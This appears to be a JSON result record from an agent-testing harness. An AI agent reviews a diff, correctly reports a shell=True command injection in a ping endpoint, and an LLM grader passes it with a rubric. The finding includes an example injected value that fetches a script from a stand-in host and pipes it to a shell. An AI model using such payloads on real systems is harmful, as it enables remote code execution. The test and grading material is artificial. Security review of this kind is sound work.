@@ -1,0 +1,52 @@
+{
+  "caseId": "cmdi-shell-true",
+  "rep": 3,
+  "prompt": "Review this diff for security issues and report your findings.",
+  "files": [
+    "diff-cmdi.patch"
+  ],
+  "output": "Command injection confirmed at `src/net/ping.py:9` — the patch replaces a safe `subprocess.run([...])` call with a `shell=True` string built via concatenation of unsanitized user input (`request.GET[\"host\"]`), enabling arbitrary OS command execution (e.g. `host=127.0.0.1;curl evil.sh|sh`). This is a critical finding; recommend reverting to the list-based call or strictly validating `host` as an IP/hostname before use.",
+  "exitCode": 0,
+  "timedOut": false,
+  "infraRetries": 0,
+  "startedAt": "2026-07-18T22:39:08.646Z",
+  "durationMs": 25349,
+  "checks": [
+    {
+      "matcher": "llm_rubric",
+      "passed": true,
+      "details": {
+        "verdict": "pass",
+        "judgments": [
+          {
+            "verdict": "pass",
+            "reasoning": "The agent correctly identified that the diff introduces an OS command injection vulnerability by switching from a safe list-based subprocess.run call to a shell=True call with string concatenation of unsanitized user input (request.GET[\"host\"]), matching the rubric's required finding exactly, including a concrete exploit example and appropriate remediation advice.",
+            "raw": "VERDICT: PASS\nREASON: The agent correctly identified that the diff introduces an OS command injection vulnerability by switching from a safe list-based subprocess.run call to a shell=True call with string concatenation of unsanitized user input (request.GET[\"host\"]), matching the rubric's required finding exactly, including a concrete exploit example and appropriate remediation advice."
+          },
+          {
+            "verdict": "pass",
+            "reasoning": "The agent's output identifies command injection at the specific location, correctly notes that shell=True with string concatenation of unsanitized request.GET[\"host\"] input enables arbitrary OS command execution, gives a plausible exploit example, and recommends a fix — this matches the rubric's required finding precisely.",
+            "raw": "VERDICT: PASS\nREASON: The agent's output identifies command injection at the specific location, correctly notes that shell=True with string concatenation of unsanitized request.GET[\"host\"] input enables arbitrary OS command execution, gives a plausible exploit example, and recommends a fix — this matches the rubric's required finding precisely."
+          }
+        ],
+        "model": "claude-sonnet-5",
+        "transport": "claude-agent",
+        "prompt": "You are an impartial evaluator inside an automated agent-testing tool. Judge ONLY whether the agent's output satisfies the rubric — not style, not effort, not whether you would have answered differently.\n\n<rubric>\nThe review must correctly identify an OS command injection vulnerability in the diff: the user-controlled 'host' value from request.GET is passed to subprocess.run with shell=True via string concatenation, allowing shell command injection. PASS only if command injection (or an equivalent unambiguous description) is identified as a genuine security vulnerability; FAIL if it misses it or makes only stylistic comments.\n</rubric>\n\n<task_given_to_agent>\nReview this diff for security issues and report your findings.\n</task_given_to_agent>\n\n<agent_output>\nCommand injection confirmed at `src/net/ping.py:9` — the patch replaces a safe `subprocess.run([...])` call with a `shell=True` string built via concatenation of unsanitized user input (`request.GET[\"host\"]`), enabling arbitrary OS command execution (e.g. `host=127.0.0.1;curl evil.sh|sh`). This is a critical finding; recommend reverting to the list-based call or strictly validating `host` as an IP/hostname before use.\n</agent_output>\n\nAnswer in EXACTLY this format (first line must be the verdict):\nVERDICT: PASS\nREASON: <one short paragraph>\n\nor\n\nVERDICT: FAIL\nREASON: <one short paragraph>"
+      }
+    }
+  ],
+  "transcript": {
+    "command": "claude",
+    "args": [
+      "-p",
+      "Review this diff for security issues and report your findings. Read the file 'diff-cmdi.patch' in your current working directory, then review it.",
+      "--permission-mode",
+      "bypassPermissions",
+      "--model",
+      "claude-sonnet-5"
+    ],
+    "exitCode": 0,
+    "timedOut": false,
+    "stderr": "Warning: no stdin data received in 3s, proceeding without it. If piping from a slow command, redirect stdin explicitly: < /dev/null to skip, or wait longer."
+  }
+}
